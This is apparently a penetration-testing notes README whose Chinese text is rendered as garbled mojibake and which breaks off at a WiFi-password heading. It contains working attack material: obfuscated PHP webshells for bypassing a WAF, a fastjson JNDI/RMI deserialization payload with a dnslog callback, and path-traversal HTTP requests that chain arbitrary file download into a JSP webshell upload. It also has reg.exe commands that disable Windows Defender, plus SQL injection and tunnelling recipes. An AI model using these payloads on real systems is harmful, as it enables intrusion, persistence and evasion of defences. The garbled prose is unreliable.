# å¯¼èˆª
- ğŸ´â€â˜  [æ‰“ç‚¹-éšè—èµ„äº§æ¢æµ‹-hostç¢°æ’](https://github.com/pen4uin/pentestNote/blob/main/README.md#%E9%9A%90%E8%97%8F%E8%B5%84%E4%BA%A7%E6%8E%A2%E6%B5%8B-host%E7%A2%B0%E6%92%9E)
- ğŸ´â€â˜  ["ç™»å½•æ¡†" æ”»å‡»é¢](https://github.com/pen4uin/pentestNote/blob/main/README.md#%E7%99%BB%E5%BD%95%E6%A1%86-%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  [å®å¡”é˜²ç«å¢™ Bypass](https://github.com/pen4uin/pentestNote/blob/main/README.md#%E5%AE%9D%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99-bypass)
- ğŸ´â€â˜  [fastjson bypass æŸWAF](https://github.com/pen4uin/pentestNote/blob/main/README.md#fastjson-bypass-%E6%9F%90waf)
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(reGeorg+Proxifier+Win)](https://github.com/pen4uin/pentestNote/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxifierwin)
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(reGeorg+proxychains+Linux)](https://github.com/pen4uin/pentestNote/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxychainslinux))
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(ssocksåå‘ä»£ç†)](https://github.com/pen4uin/pentestNote/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxychainslinux))
- ğŸ´â€â˜  [æ‰“ç‚¹-Druidæœªæˆæƒè®¿é—®->RCE](https://github.com/pen4uin/pentestNote/blob/main/README.md#druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce)
- ğŸ´â€â˜  [æ‰“ç‚¹-ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE](https://github.com/pen4uin/pentestNote/blob/main/README.md#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-rce)
- ğŸ´â€â˜  [pocsuite3ä»£ç†ä½¿ç”¨](https://github.com/pen4uin/pentestNote/blob/main/README.md#pocsuite3%E4%BB%A3%E7%90%86%E9%A3%9F%E7%94%A8)
- ğŸ´â€â˜  [æ‰“ç‚¹-å­åŸŸåçˆ†ç ´-æ³›è§£æé—®é¢˜](https://github.com/pen4uin/pentestNote/blob/main/README.md#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4-%E6%B3%9B%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98)
- ğŸ´â€â˜  ["SQLæ³¨å…¥" æ”»å‡»é¢](https://github.com/pen4uin/PentestNote/blob/main/README.md#sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  ["æ–‡ä»¶åˆ é™¤" æ”»å‡»é¢](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  ["Java SSRF" æ”»å‡»é¢](https://github.com/pen4uin/PentestNote/blob/main/README.md#java-ssrf%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  [é»‘ç›’-æ¼æ´æŒ–æ˜(å¼±å£ä»¤->ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE)](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E9%BB%91%E7%9B%92-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-rce)
- ğŸ´â€â˜  [æ‰“ç‚¹-ThinkPHP 5.0.X(debugæ¨¡å¼+ç©ºæ•°ç»„)](https://github.com/pen4uin/PentestNote#thinkphp-50xdebug%E6%A8%A1%E5%BC%8F%E7%A9%BA%E6%95%B0%E7%BB%84)
- ğŸ´â€â˜  [å†…ç½‘-CMDè·å–RDPç«¯å£](https://github.com/pen4uin/PentestNote#%E5%86%85%E7%BD%91-cmd%E8%8E%B7%E5%8F%96rdp%E7%AB%AF%E5%8F%A3)
- ğŸ´â€â˜  [å†…ç½‘-è§„é¿æ€è½¯ Windows Defender](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E5%86%85%E7%BD%91-%E8%A7%84%E9%81%BF%E6%9D%80%E8%BD%AF-windows-defender)
- ğŸ´â€â˜  [æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½-mlocate.db](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E6%89%93%E7%82%B9-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-mlocatedb)
- ğŸ´â€â˜  [å†…ç½‘-CMDè·å–WIFIå¯†ç ](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E5%86%85%E7%BD%91-cmd%E8%8E%B7%E5%8F%96wifi%E5%AF%86%E7%A0%81)
- ğŸ´â€â˜  [å†…ç½‘-DMZåŒºçªç ´](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E5%86%85%E7%BD%91-dmz%E5%8C%BA%E7%AA%81%E7%A0%B4)
- ğŸ´â€â˜  [å†…ç½‘-PowerShellå‘½ä»¤å†å²è®°å½•](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E5%86%85%E7%BD%91-powershell%E5%91%BD%E4%BB%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95)
- ğŸ´â€â˜  [å†…ç½‘-å®šä½å¤šç½‘å¡ä¸»æœº](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E5%86%85%E7%BD%91-%E5%AE%9A%E4%BD%8D%E5%A4%9A%E7%BD%91%E5%8D%A1%E4%B8%BB%E6%9C%BAoxid-resolver) 
- ğŸ´â€â˜  [å†…ç½‘-ä¸»æœº"ä¸å‡ºç½‘"](https://github.com/pen4uin/PentestNote/)
- ğŸ´â€â˜  [å†…ç½‘-è·¨åŸŸ](https://github.com/pen4uin/PentestNote/)
- ğŸ´â€â˜  [æ‰“ç‚¹-Confluence RCEåˆ©ç”¨](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E6%89%93%E7%82%B9-confluence-rce%E5%88%A9%E7%94%A8)
- ğŸ´â€â˜  [æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½-.netç¯å¢ƒ](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E6%89%93%E7%82%B9-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-net%E7%8E%AF%E5%A2%83)
- ğŸ´â€â˜  [ç§‹æ‹›-ä»å®‰æœ->å®‰ç ”(é¢ç»)](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E7%A7%8B%E6%8B%9B-%E4%BB%8E%E5%AE%89%E6%9C%8D-%E5%AE%89%E7%A0%94%E9%9D%A2%E7%BB%8F)
  - ğŸ´â€â˜  [(2020å®ä¹ )-å®‰å…¨æœåŠ¡å·¥ç¨‹å¸ˆ(é©»åœº)](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E7%A7%8B%E6%8B%9B-%E4%BB%8E%E5%AE%89%E6%9C%8D-%E5%AE%89%E7%A0%94%E9%9D%A2%E7%BB%8F)
  - ğŸ´â€â˜  [(2020å®ä¹ )-å®‰å…¨ç ”ç©¶/æŠ€æœ¯æ”¯æŒ(åæ”»é˜²)](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E7%A7%8B%E6%8B%9B-%E4%BB%8E%E5%AE%89%E6%9C%8D-%E5%AE%89%E7%A0%94%E9%9D%A2%E7%BB%8F)
  - ğŸ´â€â˜  [(2021ç¤¾æ‹›)-çº¢é˜Ÿæ”»é˜²å·¥ç¨‹å¸ˆ](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E7%A7%8B%E6%8B%9B-%E4%BB%8E%E5%AE%89%E6%9C%8D-%E5%AE%89%E7%A0%94%E9%9D%A2%E7%BB%8F)
  - ğŸ´â€â˜  [(2021å®ä¹ )-æŸå®éªŒå®¤å®‰å…¨ç ”ç©¶å‘˜](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E7%A7%8B%E6%8B%9B-%E4%BB%8E%E5%AE%89%E6%9C%8D-%E5%AE%89%E7%A0%94%E9%9D%A2%E7%BB%8F)
  - ğŸ´â€â˜  [(2021å®ä¹ /æ ¡æ‹›)-æ”»é˜²ç ”ç©¶å‘˜(ååº”ç”¨)](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E7%A7%8B%E6%8B%9B-%E4%BB%8E%E5%AE%89%E6%9C%8D-%E5%AE%89%E7%A0%94%E9%9D%A2%E7%BB%8F)
  - ğŸ´â€â˜  [(2021æ ¡æ‹›)-æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆ(åSDL)](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E7%A7%8B%E6%8B%9B-%E4%BB%8E%E5%AE%89%E6%9C%8D-%E5%AE%89%E7%A0%94%E9%9D%A2%E7%BB%8F)
  - ğŸ´â€â˜  [(2021æ ¡æ‹›)-å®‰å…¨ç ”ç©¶å‘˜(SASTæ–¹å‘)](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E7%A7%8B%E6%8B%9B-%E4%BB%8E%E5%AE%89%E6%9C%8D-%E5%AE%89%E7%A0%94%E9%9D%A2%E7%BB%8F) 
- ğŸ´â€â˜  [å†…ç½‘-vSphere & vCenterçš„ååˆ©ç”¨å§¿åŠ¿](https://github.com/pen4uin/PentestNote/blob/main/README.md#%E5%86%85%E7%BD%91-vSphere%20%26%20vCenter%E7%9A%84%E5%90%8E%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF)
### éšè—èµ„äº§æ¢æµ‹-hostç¢°æ’

step1: æœé›†å­åŸŸå 

step2: æœé›†IP (ç›®æ ‡åŸŸåå†å²è§£æIP)

step3: ä»¥IP+åŸŸåçš„å½¢å¼è¿›è¡Œç¢°æ’


ä¼ é€ï¼š
```
https://github.com/fofapro/Hosts_scan 
https://github.com/shmilylty/OneForAll  
https://fofa.so/
https://site.ip138.com/
https://ipchaxun.com/
https://securitytrails.com/list/apex_domain/  # å­åŸŸå
```
å‚è€ƒï¼š
```
https://www.cnblogs.com/Rain99-/p/13756032.html
https://xz.aliyun.com/t/9590
```
### "ç™»å½•æ¡†" æ”»å‡»é¢
- ç”¨æˆ·åæšä¸¾
- ç©ºå£ä»¤
- å¼±å£ä»¤
- ç™»å½•è®¤è¯ç»•è¿‡
- æš´åŠ›ç ´è§£
- å›¾å½¢éªŒè¯ç ç»•è¿‡
- çŸ­ä¿¡éªŒè¯ç ç»•è¿‡ï¼ˆæˆ–çˆ†ç ´ï¼‰
- çŸ­ä¿¡è½°ç‚¸ï¼ˆé‡æ”¾ï¼‰
- é‚®ç®±è½°ç‚¸ï¼ˆé‡æ”¾ï¼‰
- å¯†ç æ˜æ–‡ä¼ è¾“
- SQLæ³¨å…¥ï¼ˆä¸‡èƒ½å¯†ç ï¼‰
- ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®
- ç›®å½•éå†
- æ•æ„Ÿä¿¡æ¯æ³„éœ²
- æ¡†æ¶æ¼æ´ï¼ˆshiroï¼‰
- XSS
- JSæ–‡ä»¶

### å®å¡”é˜²ç«å¢™ Bypass
- ä¼ å‚æ–¹å¼ $_COOKIE
- ç¼–ç ç»•è¿‡æµé‡æ£€æµ‹

*3é‡ base64 å¤±è´¥*ï¼ˆä¼¼ä¹æ£€æµ‹äº†å…³é”®å­—â€˜base64â€™ï¼‰
![image](https://user-images.githubusercontent.com/55024146/119949340-5c6fda80-bfcc-11eb-84bb-4d2543af7bea.png)

*3é‡ urlç¼–ç  æˆåŠŸ*

![image](https://user-images.githubusercontent.com/55024146/119950026-08192a80-bfcd-11eb-8197-3d6d695b4681.png)

è´´ä¸¤ä¸ªğŸ(`ä¾µåˆ `)

demo1:
```php
<?php
$p=$_COOKIE;(count($p)==23&&in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])&&($p[91]=$p[59]($p[91]))&&($p=$p[91]($p[90],$p[59]($p[31])))&&$p()):$p;
?>
```
demo2:
```php
<?php
$poc ="axsxsxexrxt";
$poc_1 = explode("x", $poc);
$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3]. $poc_1[4]. $poc_1[5];
$poc_2(urldecode(urldecode(urldecode($_REQUEST[x]))));
?>
```

### fastjson bypass æŸWAF
demo
```
{{"@type":"java.net.URL","val":"http://.dnslog.cn"}:0
```
![image](https://user-images.githubusercontent.com/55024146/119951579-aeb1fb00-bfce-11eb-87aa-67f3dbbd7fb8.png)

bypass
```
{"@type":\b"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:9999","autoCommit":true}}
```
### å†…ç½‘æ¸—é€-ä»£ç†(reGeorg+Proxifier+Win)

```
# reGeorg
https://github.com/sensepost/reGeorg
# Proxifier
https://pc.qq.com/detail/13/detail_10593.html
```
ä¸Šä¼ å¯¹åº”çš„tunnelæ–‡ä»¶ï¼Œå¦‚å›¾å³å¯

![image](https://user-images.githubusercontent.com/55024146/122792344-aa86ae00-d2ec-11eb-82fd-7b9102a0d501.png)

ç„¶åattack-pc æ‰§è¡Œ
```python
python2 reGeorgSocksProxy.py -u http://192.168.10.211/tunnel.nosocket.php -p 8888
```
proxifieré…ç½®ä»£ç†å¦‚ä¸‹
- 127.0.0.1:8888
- socks5

### å†…ç½‘æ¸—é€-ä»£ç†(reGeorg+proxychains+Linux)
```
# reGeorg
https://github.com/sensepost/reGeorg
# Proxifier
https://pc.qq.com/detail/13/detail_10593.html
```
ä¸Šä¼ å¯¹åº”çš„tunnelæ–‡ä»¶ï¼Œå¦‚å›¾å³å¯

![image](https://user-images.githubusercontent.com/55024146/122792344-aa86ae00-d2ec-11eb-82fd-7b9102a0d501.png)

ç„¶åattack-pc æ‰§è¡Œ
```python
python2 reGeorgSocksProxy.py -u http://192.168.10.211/tunnel.nosocket.php -p 4561
```
proxychainsé…ç½®å¦‚ä¸‹ï¼š
- vim /etc/proxychains.conf

![image](https://user-images.githubusercontent.com/55024146/122793053-56c89480-d2ed-11eb-9d5d-3dbcd204a6d7.png)

demo:
ä½¿ç”¨proxychainsä»£ç†è¿œç¨‹ç™»å½•windows
```
proxychains rdesktop -g 1440x900 172.17.17.7:3389 //-gåé¢ä»£è¡¨è¦ä½¿ç”¨çš„åˆ†è¾¨ç‡
```

### å†…ç½‘æ¸—é€-ä»£ç†(ssocksåå‘ä»£ç†)
```
https://sourceforge.net/projects/ssocks/
```
å‚è€ƒï¼š
https://apt404.github.io/2016/09/12/ssocks/

### Druidæœªæˆæƒè®¿é—®->RCE
- ç›®å½•æ‰«æ  /druid/index.html
- ä¿¡æ¯æ³„éœ²  Session & URI(åå°)
- ä¼ªé€ sessionè¿›å…¥åå°ï¼Œå‘ç°ä¸Šä¼ ç‚¹
```
POST /index HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: 
Referer: 
Cookie: JSESSIONID=589A43F0FAxxxxxx2A4403C143A77A51
```
- ç»•è¿‡å‰ç«¯jséªŒè¯å®ç°ä»»æ„æ–‡ä»¶ä¸Šä¼ 
### ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE
- å‘ç°1å¤„æ–‡ä»¶ä¸‹è½½çš„åœ°æ–¹
```
GET /download?module=&method=Download&name=test.zip&filepath=doc/test.zip HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate
```
- burpæŠ“åŒ…ï¼Œæ¢ä¸ºpostè¯·æ±‚å‘ç°å¯ä¸‹è½½ä»»æ„æ–‡ä»¶
```
POST /download HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate

module=&method=Download&name=test.zip&filepath=../webapps/WEB-INF/web.xml
```
- è¯»å–æ—¥å¿—æ–‡ä»¶åˆ¤æ–­classæ–‡ä»¶çš„ä½ç½®
```
POST /download HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate

module=&method=Download&name=test.zip&filepath=../logs/catalina.2021-xx-xx.log
```
- ä¸‹è½½classæ–‡ä»¶åˆ†æå®¡è®¡,åœ¨/downloadè·¯ç”±ä¸‹çš„servletå­˜åœ¨ä¸Šä¼ æ–‡ä»¶å’Œæ›´æ–°æ–‡ä»¶çš„æ“ä½œ
  - é¦–å…ˆä¸Šä¼ ä¸€ä¸ªç©ºæ–‡ä»¶åˆ°webç›®å½•
  ```
  POST /download HTTP/1.1
  Host: 1.1.1.1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
  Accept: text/html,application/xhtml+xml,application/xml
  Accept-Encoding: gzip, deflate

  module=&method=upload&txtFile_Name=x.jsp&home=/&filepath=../webapps/
  ```

  - æ›´æ–°æ–‡ä»¶å†…å®¹ä¸ºwebshell
  ```
  POST /download HTTP/1.1
  Host: 1.1.1.1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
  Accept: text/html,application/xhtml+xml,application/xml
  Accept-Encoding: gzip, deflate

  module=&method=updateContent&home=/&filepath=../webapps/x.jsp&content=xxxxxx
  ```
- æˆåŠŸçªç ´ç½‘ç»œè¾¹ç•Œè¿›å…¥å†…ç½‘

### pocsuite3ä»£ç†é£Ÿç”¨
å‘½ä»¤è¡Œï¼š
```shell
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy socks5://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy socks4://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy http://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy https://1.2.3.4:5678
```
proxierï¼š

![image](https://user-images.githubusercontent.com/55024146/125926069-5b29debf-31b2-4642-8f24-aea0d019e3c8.png)

### å­åŸŸåçˆ†ç ´-æ³›è§£æé—®é¢˜
0.æ³›è§£æ
```shell
åŸç†ï¼š
åˆ©ç”¨é€šé…ç¬¦(*)å°†æ‰€æœ‰æŸä¸ªçº§åˆ«çš„åŸŸåè§£æåˆ°åŒä¸€ä¸ªIPåœ°å€ä¸Šã€‚

ä¸¾ä¾‹:
ç°æœ‰åŸŸågithub.com, è®¾ç½®æ³›è§£æåï¼Œæ‰€æœ‰è¯¥åŸŸåä¸‹çš„å­åŸŸaaa.github.com,bbb.aaa.github.coméƒ½ä¼šè¢«è§£æåˆ°å’Œgithub.comç›¸åŒçš„ipåœ°å€ã€‚
```
1.OneForAll:
```shell
è®¿é—®ä¸€ä¸ªéšæœºçš„å¹¶ä¸å­˜åœ¨çš„åŸŸï¼Œé€šè¿‡è¿”å›ç»“æœåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³›è§£æï¼Œè‹¥å­˜åœ¨æ³›è§£æï¼Œç¨‹åºä¼šä¸æ–­çš„å¾ªç¯äº§ç”ŸéšæœºåŸŸåå‘æœåŠ¡å™¨æŸ¥è¯¢ï¼Œå°†æ¯æ¬¡æŸ¥è¯¢åˆ°çš„IPå’ŒTTLè®°å½•ä¸‹æ¥ï¼Œç›´åˆ°å¤§éƒ¨åˆ†çš„IPåœ°å€å‡ºç°æ¬¡æ•°éƒ½å¤§äºä¸¤æ¬¡ï¼Œåˆ™IPé»‘åå•çš„æ”¶é›†ç»“æŸï¼Œåœ¨å¾—åˆ°äº†IPé»‘åå•ä»¥åï¼Œå°†è‡ªå·±çš„å­—å…¸ä¸­çš„æ¯ä¸€é¡¹å’Œè¦æŒ‡å®šæŸ¥è¯¢çš„åŸŸåè¿›è¡Œæ‹¼æ¥çˆ†ç ´ï¼Œç„¶åæ ¹æ®IPé»‘åå•è¿›è¡Œè¿‡æ»¤ã€‚
```
2.SubdomainBrute

```shell
è¶…è¿‡10ä¸ªåŸŸåæŒ‡å‘åŒä¸€IPï¼Œåˆ™æ­¤åå‘ç°çš„å…¶ä»–æŒ‡å‘è¯¥IPçš„åŸŸåå°†è¢«ä¸¢å¼ƒã€‚
```
3.ç›®å‰æ€è·¯-TTLé»‘åå•
```shell
åœ¨æƒå¨ DNS ä¸­ï¼Œæ³›è§£æè®°å½•çš„ TTL è‚¯å®šæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœå­åŸŸåè®°å½•ç›¸åŒï¼Œä½† TTL ä¸åŒï¼Œé‚£è¿™æ¡è®°å½•å¯ä»¥è¯´è‚¯å®šä¸æ˜¯æ³›è§£æè®°å½•ã€‚
```
å‚è€ƒï¼šhttp://sh3ll.me/

### SQLæ³¨å…¥æ”»å‡»é¢

- ä¸‡èƒ½å¯†ç 
- æ•æ„Ÿä¿¡æ¯  `é‚®ç®±/ç”µè¯ç­‰ -> ä¾›ç¤¾å·¥é’“é±¼ä½¿ç”¨`
- å‡­è¯  `session/å¯†ç ç­‰ -> å¤–ç½‘ç³»ç»Ÿå…¥å£(OA/é‚®ç®±/VPN)`
- RCE
  - mssql xp_cmdshell
  - mysql udf
- Webshell
  - mysql
  - mssql
  - oracle
- SSRF
  - mssql
  - oracle
- ç«¯å£æ‰«æ
  - oracle
- å‡­æ®(NTLM Hash)
  - Windows & UNC 

### æ–‡ä»¶åˆ é™¤æ”»å‡»é¢

- åˆ é™¤install.lockå¯¼è‡´é‡è£…ï¼Œè¿›è€ŒRCE
  -  /sys/install.lock VAuditDemo
- åˆ é™¤æŸäº›é…ç½®æ–‡ä»¶å¯¼è‡´é‡è£…ï¼Œè¿›è€ŒRCE
  -  my.php ç„¶ä¹‹ååŒ
- åˆ é™¤æƒé™æ ¡éªŒæ–‡ä»¶ï¼Œç»„åˆå—é™æ¼æ´(æ–‡ä»¶ä¸Šä¼ /SQLiæ³¨å…¥ç­‰)ï¼Œè¿›è€ŒRCE
  -  /inc/auth.inc.php é€šè¾¾OA
- åˆ é™¤è´¦å·å¯†ç é…ç½®æ–‡ä»¶ï¼Œå¯¼è‡´è´¦å·å¯†ç é‡æ–°é…ç½®ï¼Œè¿›è€Œè·å¾—ç®¡ç†å‘˜æƒé™
  -  /WEB-INF/resources/privilege.xml å¸†è½¯æŠ¥è¡¨ç³»ç»Ÿ(FineReport)
### Java SSRFæ”»å‡»é¢

- åˆ©ç”¨fileåè®®ä»»æ„æ–‡ä»¶è¯»å–
- åˆ©ç”¨httpåè®®ç«¯å£/æœåŠ¡æ¢æµ‹
- åˆ©ç”¨httpåè®®è¿›è¡Œ ntlm relay
- ç»„åˆredisç­‰å†…ç½‘æœåŠ¡ä»è€Œrce(weblogic)

### é»‘ç›’-æ¼æ´æŒ–æ˜(å¼±å£ä»¤->ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE)
- Tip: `fofaéšç¼˜ï¼Œç‹¬ç«‹ip 1000+å³å¯`
![image](https://user-images.githubusercontent.com/55024146/131246806-76084a34-cfa4-454b-ba83-2f17afdc17f5.png)

**step1** 
- æœç´¢äº§å“çš„å®‰è£…æ‰‹å†Œ/ç”¨æˆ·æ‰‹å†Œï¼ˆå¼±å£ä»¤ï¼Œå½±å­è´¦æˆ·ç­‰ï¼‰
- å‘ç°é€šç”¨å¼±å£ä»¤-admin/admin
  ![image](https://user-images.githubusercontent.com/55024146/131246914-bc2a9913-ab8d-44ac-9b36-401e9d47d264.png)

**step2**
- ç™»å½•åå°å¹¶æµ‹è¯•åŠŸèƒ½ç‚¹ï¼ŒburpæŠ“å–æµé‡
- å‘ç°å‚æ•°ï¼š?xmlPath=
  - æ„é€ payload
  ```
  .action?xmlPath=../../conf/tomcat-users.xml
  .action?xmlPath=../../webapps/examples/WEB-INF/web.xml
  ```
- ç»æµ‹è¯•å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´
  ![image](https://user-images.githubusercontent.com/55024146/131247048-5deb0483-ab3a-4394-9711-a3122e466caa.png)

**step3**
- å›æº¯burpçš„ä»£ç†æµé‡
- cookieå‘ç°å‚æ•°:rememberMe
- å°è¯•ç»„åˆä»»æ„æ–‡ä»¶è¯»å–è¿›è¡Œæ¼æ´åˆ©ç”¨
  - web.xml -> shiro.ini(å¤±è´¥)
  - tomcat-users.xml -> æ§åˆ¶å°åˆ©ç”¨æ€è·¯(å¤±è´¥)
- æœ€åè¿˜æ˜¯ä½œä¸ºè„šæœ¬å°å­çš„å¿«ä¹:)
  ![image](https://user-images.githubusercontent.com/55024146/131247374-b65507ba-97c0-48b6-b3d7-8034d74bc8d9.png)

  
### ThinkPHP 5.0.X(Debugæ¨¡å¼+ç©ºæ•°ç»„)
- è‹¥ç›®æ ‡å¯ç”¨äº† debug æ¨¡å¼ï¼Œæ•æ„ŸåŠŸèƒ½ç‚¹ä¼ é€’ç©ºæ•°ç»„å¯èƒ½ä¼šå¼•èµ·ç¨‹åºæŠ›å‡ºå¼‚å¸¸æ³„éœ²æ•æ„Ÿä¿¡æ¯ by xxxeyJ
```http
POST /index/login HTTP/1.1
User-Agent: 
Accept: 
Accept-Encoding: 
Content-Type: 

username=admin&password[]=&verifycode=
```
### å†…ç½‘-CMDè·å–RDPç«¯å£
Terminalä¸‹æ‰§è¡Œ
> REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber

å“åº”
> PortNumber    REG_DWORD    0xd3d 

![image](https://user-images.githubusercontent.com/55024146/132183605-7c089977-c0ef-4fd5-90b7-f0f9d8c8501e.png)

è¿›åˆ¶è½¬æ¢å¾—åˆ°

![image](https://user-images.githubusercontent.com/55024146/132183711-ac078a35-d868-401b-a6ff-7f968a77af01.png)

### å†…ç½‘-è§„é¿æ€è½¯ Windows Defender
```shell
# Defensive Evasion
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v MpEnablePus /t REG_DWORD /d 0 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v SpynetReporting /t REG_DWORD /d 0 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
reg.exe     delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
```
### æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½/ä¿¡æ¯æ”¶é›† mlocate.db

   mlocate.dbæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œç”¨äºå­˜æ”¾locateå‘½ä»¤çš„ç´¢å¼•ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºå­˜æ”¾äº†æ‰€æœ‰æ–‡ä»¶çš„è·¯å¾„ã€‚

æ–‡ä»¶ä½ç½®
> /var/lib/mlocate/mlocate.db

ä¸ä¹‹å¯¹åº”çš„å‘½ä»¤ â€” locate

åœ¨æ‹¿åˆ°ç›®æ ‡æƒé™ååšä¿¡æ¯æ”¶é›†è¿˜æ˜¯è›®ä¸é”™çš„

```shell
locate web.xml
```
![image](https://user-images.githubusercontent.com/55024146/133720395-fe1a4175-0dc3-4d22-bcf1-ff958bb15a9a.png)

### å†…ç½‘-CMDè·å–WIFIå¯†ç 
â€” by chengmo
```
